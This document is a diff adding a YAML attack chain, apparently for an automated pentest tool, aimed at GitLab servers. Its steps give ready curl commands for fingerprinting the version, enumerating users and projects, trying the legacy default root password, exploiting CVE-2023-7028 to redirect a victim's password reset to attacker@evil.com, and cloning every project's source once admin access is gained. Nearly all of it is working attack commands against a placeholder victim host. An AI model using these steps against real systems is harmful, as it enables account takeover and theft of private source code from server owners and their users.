@@ -1,0 +1,49 @@
+chain_id: gitlab_recon_and_cve
+title: "GitLab — recon, default creds, CVE-2023-7028 password reset, group/project enum"
+severity: HIGH
+tags: [web, gitlab, default-creds, cve-2023-7028, recon, source-disclosure]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)gitlab" }
+    - { path_pattern: "(?i)/users/sign_in" }
+    - { path_pattern: "(?i)/api/v4/" }
+
+description: |
+  GitLab Community / Enterprise. Recon: version pings the homepage,
+  public projects/snippets / users hand you usernames, and CVE-2023-7028
+  (16.1.0 - 16.5.x) lets an unauth attacker trigger a password reset
+  for *any* user to an attacker-controlled email.
+
+steps:
+  - id: 1
+    title: "Version + sign-in page"
+    command: |
+      curl -s http://$VICTIMA/help | grep -i 'gitlab community'
+      curl -s http://$VICTIMA/users/sign_in | grep -oE 'GitLab [0-9.]+' | head -1
+
+  - id: 2
+    title: "Enumerate users / projects via the public API"
+    command: |
+      curl -s http://$VICTIMA/api/v4/users | jq '.[] | .username' | head
+      curl -s http://$VICTIMA/api/v4/projects | jq '.[] | .path_with_namespace' | head
+
+  - id: 3
+    title: "Default credentials still very common: root:5iveL!fe (legacy) or admin reset"
+    command: |
+      curl -s -X POST -d 'user[login]=root&user[password]=5iveL!fe' http://$VICTIMA/users/sign_in
+
+  - id: 4
+    title: "CVE-2023-7028 — password reset via array params (16.1 - 16.5)"
+    command: |
+      curl -X POST 'http://$VICTIMA/users/password' \
+        -F 'user[email][]=victim@target.com' \
+        -F 'user[email][]=attacker@evil.com'
+
+  - id: 5
+    title: "Once authenticated as admin, dump every project's source"
+    command: |
+      curl -H "PRIVATE-TOKEN: $TOKEN" "http://$VICTIMA/api/v4/projects?per_page=100" | jq -r '.[].web_url' | xargs -I{} git clone {}
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-7028
